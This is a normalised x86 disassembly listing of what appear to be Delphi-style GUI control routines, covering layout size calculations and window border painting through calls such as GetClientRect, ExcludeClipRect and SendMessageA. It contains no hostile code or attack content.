call sub_4191a8
push eax
mov eax [ ebp - 0x4 ]
call sub_47d41c
pop edx
call sub_47a4d4
mov edx [ edi + 0x48 ]
call sub_47b4dc
mov eax edi
call sub_47baa4
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x40 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax esi
call sub_47b0a8
test eax eax
jne r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
mov dl 0x1
mov eax esi
call sub_479bb4
test al al
je r-xdata
mov eax esi
call sub_4191a8
push eax
mov eax [ ebp - 0x4 ]
call sub_47d41c
pop edx
call sub_47a4d4
call sub_479bf4
mov edx ebx
call sub_419738
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0xc ] eax
mov edx ebx
mov eax edi
call sub_47ba70
mov edx eax
mov eax [ ebp - 0xc ]
call sub_47b3d0
mov eax [ edi + 0x38 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0xc ]
call sub_47b5fc
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
xor edx edx
jmp r-xdata
mov eax esi
call sub_479bf4
call sub_47a850
test eax eax
jg r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_47dbd4
push ebx
push esi
mov ebx eax
xor ecx ecx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
sub_47dc04
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_449040
mov al [ esi + 0x227 ]
add al 0xfe
sub al 0x2
jb r-xdata
pop esi
pop ebx
retn
sub bl 0x1
jb r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x134 ]
jmp r-xdata
sub bl 0x3
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x134 ]
jmp r-xdata
sub_47dc48
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x3
jb r-xdata
mov eax [ ebx + 0x254 ]
mov esi eax
add esi esi
mov edx [ ebx + 0x250 ]
mov ecx edx
dec ecx
imul esi ecx
mov ecx [ ebx + 0x268 ]
imul ecx edx
add ecx eax
add esi ecx
add esi eax
cmp [ ebx + 0x25c ] 0x0
je r-xdata
test [ ebx + 0x208 ] 0x2
je r-xdata
cmp [ ebx + 0x250 ] 0x1
jle r-xdata
test [ ebx + 0x208 ] 0x8
je r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x250 ]
dec eax
add eax eax
add esi eax
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
inc esi
inc esi
inc esi
inc esi
sub_47dcf8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_47dfd0
test al al
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x2
je r-xdata
mov eax [ ebx + 0x258 ]
mov esi eax
add esi esi
mov edx [ ebx + 0x24c ]
mov ecx edx
dec ecx
imul esi ecx
mov ecx [ ebx + 0x26c ]
imul ecx edx
add ecx eax
add esi ecx
add esi eax
cmp [ ebx + 0x265 ] 0x0
je r-xdata
test [ ebx + 0x208 ] 0x1
je r-xdata
cmp [ ebx + 0x24c ] 0x1
jle r-xdata
test [ ebx + 0x208 ] 0x4
je r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x24c ]
add eax eax
add esi eax
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov al [ ebx + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
inc esi
inc esi
inc esi
inc esi
sub_47de3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47deaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4191a8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4789e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
sub_47debc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47df2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44a260
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47df36
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
sub_47df3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4508b8
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_479b80
call sub_419538
test eax eax
jle r-xdata
mov eax ebx
call sub_47ea88
mov ecx [ ebx + 0x4 ]
mov dl 0x1
call [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_4032d8
mov esi eax
mov [ esi + 0x270 ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax esi
call sub_44cf0c
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx [ ebx + 0x210 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x124 ]
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_472860
mov eax esi
call sub_403128
sub_47dfd0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x210 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_47dffc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov esi [ edi + 0x210 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
mov si 0xffee
call sub_403324
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_47a120
sub_47e034
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
lea ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417088
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_47d014
mov ebx eax
mov eax [ esi + 0x40 ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_44894c
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax edi
call sub_47d41c
mov edx eax
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x16c ]
call sub_4191a8
push eax
mov eax [ ebx + 0x16c ]
call sub_47b09c
call sub_419538
dec eax
pop edx
cmp edx eax
jge r-xdata
lea edx [ ebp - 0x30 ]
mov eax ebx
call sub_44894c
mov eax [ ebp - 0x24 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov edx [ esi + 0x40 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_44894c
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov [ ebp - 0x8 ] 0x1
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x30 ]
mov eax ebx
call sub_44894c
mov eax [ ebp - 0x2c ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
mov eax edi
call sub_47d41c
mov edx eax
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x16c ]
call sub_4191a8
mov edx eax
add edx [ ebp - 0x8 ]
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
sub_47e144
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x210 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_479bf4
call sub_419538
dec eax
test eax eax
jl r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd8 ]
inc eax
mov ebx eax
xor edi edi
mov eax [ esi + 0x210 ]
call sub_479bf4
mov edx edi
call sub_47a4d4
add eax 0x40
call sub_40d31c
inc edi
dec ebx
jne r-xdata
sub_47e198
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax ebx
call sub_44b61c
test al al
jne r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f1c4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ ebx + 0x210 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jb r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xfc ]
mov [ ebp + 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x100 ]
mov edi eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edi esi
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
cmp edi [ ebx + 0x48 ]
je r-xdata
mov esi edi
sub_47e24c
push ebx
push esi
mov esi edx
mov ebx eax
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44d968
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
pop esi
pop ebx
retn
sub_47e280
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x220 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x220 ] eax
test eax eax
jne r-xdata
mov edx ebx
call sub_47bcdc
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_47bba4
mov eax [ ebx + 0x220 ]
mov edx [ eax + 0x40 ]
mov eax ebx
call sub_44914c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_47e314
mov [ ebx + 0x220 ] eax
push 0x0
push 0x1
push 0x85
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
sub_47e314
push ebx
push esi
mov ebx eax
lea eax [ ebx + 0x274 ]
call sub_40d31c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10c ]
mov ecx ebx
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x274 ] esi
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x274 ]
call sub_4214a8
mov edx ebx
mov eax [ ebx + 0x274 ]
call sub_47bba4
mov eax [ ebx + 0x274 ]
pop esi
pop ebx
retn
sub_47e384
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
cmp dl [ eax + 0x208 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x209 ]
add cl dl
add eax eax
add cl al
lea eax [ edx + edx * 2 ]
add cl al
sub cl 0x3
mov [ ebp - 0x11 ] cl
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov ebx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov esi [ eax + 0x40 ]
xor eax eax
mov al [ ebp - 0x11 ]
cmp eax 0xb
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov ebx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov esi [ eax + 0x40 ]
jmp [ eax * 4 + jump_table_47e3f7 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0xc ]
call sub_424758
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov edx 0xffffffe2
call sub_46b1b8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffe7
call sub_46b1b8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0xffffffce
call sub_46b1b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov eax [ eax + 0x40 ]
mov edx 0x13
call sub_46b0f8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
mov edx [ ebp - 0x29 ]
call sub_424f44
mov edx [ ebp - 0x31 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jb r-xdata
lea eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetClientRect
lea eax [ ebp - 0x31 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x31 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x2d ]
neg eax
push eax
mov eax [ ebp - 0x31 ]
neg eax
push eax
lea eax [ ebp - 0x21 ]
push eax
call OffsetRect
mov eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x19 ]
push eax
mov eax [ ebp - 0x1d ]
push eax
mov eax [ ebp - 0x21 ]
push eax
push edi
call ExcludeClipRect
mov eax [ ebp - 0x2d ]
neg eax
push eax
mov eax [ ebp - 0x31 ]
neg eax
push eax
lea eax [ ebp - 0x31 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47ea5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx edi
call sub_425300
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424864
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
mov edx [ ebp - 0x31 ]
call sub_424f44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x25 ]
mov edx [ ebp - 0x31 ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_424758
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x1
je r-xdata
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f44
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x31 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x31 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f44
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov edx [ ebp - 0x31 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_424758
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
je r-xdata
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
call sub_424f44
mov ecx [ ebp - 0x25 ]
dec ecx
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jb r-xdata
mov ecx [ ebp - 0x25 ]
dec ecx
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f44
mov ecx [ ebp - 0x25 ]
dec ecx
mov edx [ ebp - 0x31 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_424758
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
je r-xdata
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x29 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f44
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov edx [ ebp - 0x29 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424ee4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x8 ]
call sub_425300
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov edx [ ebp - 0x29 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424f44
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x31 ]
call sub_424ee4
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
sub_47ea90
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x220 ]
mov esi eax
mov edx [ eax + 0x40 ]
mov eax ebx
call sub_44914c
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_47e314
mov esi [ ebx + 0x274 ]
sub_47eabc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44ad28
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov [ esp ] 0xb411
xor eax eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
mov edx esp
mov eax ebx
call sub_44c528
sub_47eb00
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi ]
sub eax 0xb014
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540d8
test al al
je r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov bl 0x1
sub_47eb5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450a00
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x16
mov eax esi
call sub_448764
mov edx 0x16
mov eax esi
call sub_448740
mov [ esi + 0x171 ] 0x0
mov dl 0x1
mov eax esi
call sub_449120
push 0x4
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x4
mov edx 0x4
mov eax 0x4
call sub_4170c4
push esi
lea edi [ esi + 0x17a ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x1a0 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_47ec04
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450a5c
test bl bl
jle r-xdata
cmp esi [ eax + 0x40 ]
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
xor edx edx
mov [ eax + 0x40 ] edx
sub_47ec40
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax + 0x8 ]
xor edx edx
mov eax ebx
call sub_44968c
pop ebx
retn
sub_47ec64
push ebx
mov ebx eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
call sub_4804d0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
mov eax [ ebx + 0x198 ]
sub eax [ ebx + 0x190 ]
pop ebx
retn
mov eax [ ebx + 0x16c ]
call sub_47b09c
cmp [ eax + 0x28 ] 0x2
jne r-xdata
xor eax eax
pop ebx
retn
sub_47ecac
push ebx
mov ebx eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
call sub_4804d0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
mov eax [ ebx + 0x19c ]
sub eax [ ebx + 0x194 ]
pop ebx
retn
mov eax [ ebx + 0x16c ]
call sub_47b09c
cmp [ eax + 0x28 ] 0x2
jne r-xdata
xor eax eax
pop ebx
retn
sub_47ecf4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_47ec64
test eax eax
jne r-xdata
